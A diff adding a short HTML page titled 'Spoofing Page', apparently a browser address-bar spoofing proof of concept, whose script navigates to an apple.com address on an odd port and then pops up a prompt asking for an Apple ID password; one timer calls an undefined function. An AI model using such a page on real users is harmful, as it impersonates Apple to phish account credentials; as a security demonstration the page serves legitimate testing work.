@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Spoofing Page</title>
+    </head>
+    <body>
+        <script>
+            function spoof() {
+                document.write("<h1>This is not apple.com</h1>");
+                window.location.assign("http://www.apple.com:1234");
+                setInterval(spoof24, 2000);
+                setTimeout(function () {
+                    prompt('Checking your appid password:');
+                }, 6000);
+            }
+        </script>
+        <input type="button" value="Run" onclick="spoof()"/>
+    </body>
+</html>
